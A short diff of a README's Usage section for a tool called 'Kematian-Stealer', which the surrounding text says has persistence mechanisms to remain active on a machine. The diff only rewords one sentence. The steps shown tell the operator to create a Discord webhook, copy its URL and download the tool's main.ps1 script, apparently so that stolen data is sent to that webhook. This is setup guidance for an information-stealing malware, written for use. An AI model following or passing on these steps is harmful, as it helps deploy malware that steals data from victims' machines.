@@ -32,7 +32,7 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 <br>
 
 # Usage
-- Create a Webhook on your [Discord Server](https://discord.com), its recommended that you create a new server.
+- Create a Webhook on your [Discord Server](https://discord.com), it's advisable to make a new server for this purpose.
 - After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
 - Copy the `Webhook URL`
 - Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
